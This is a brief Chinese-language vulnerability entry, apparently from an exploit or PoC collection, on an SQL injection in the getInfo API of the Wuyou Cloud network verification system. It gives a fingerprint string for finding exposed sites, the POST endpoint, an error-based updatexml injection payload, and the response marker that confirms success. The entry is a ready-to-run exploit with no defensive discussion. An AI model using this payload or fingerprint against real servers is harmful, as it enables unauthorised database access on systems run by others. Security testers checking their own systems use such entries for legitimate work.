# 无忧云网络验证系统getInfo接口SQL注入漏洞

无忧云网络验证系统getInfo接口 ｜ SQL注入 ｜ —
- **指纹**：`body="zhuya/js/base.js"`
- **请求**：`POST /index.php/api/Software/getInfo HTTP/1.1`

**Payload**
```
data=123456&id=1 and updatexml(1,concat(0x7e,md5(123),0x7e),1)
```
- **响应特征**：200 3d505516e0c197